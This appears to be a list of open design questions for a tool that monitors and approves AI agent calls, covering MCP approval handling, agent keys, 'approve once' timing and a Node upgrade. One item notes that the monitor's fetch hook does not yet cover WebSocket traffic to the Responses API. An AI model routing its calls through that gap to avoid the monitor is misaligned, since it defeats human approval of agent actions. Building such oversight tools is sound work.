- **Hosted MCP approvals.** Answering an approval request takes a follow-up model request. Decide whether monitor sends it inside the same client call or hands it to the app.
- **Agent keys.** One key per agent, or one per app that may host several agents.
- **Late "approve once".** Used by the next identical call, as picked above, or dropped.
- **WebSocket transport.** The OpenAI Agents SDK can reach the Responses API over a WebSocket. The fetch hook does not cover it yet.
- **Node 26** becomes LTS on 2026-10-28. Move the services to it then.
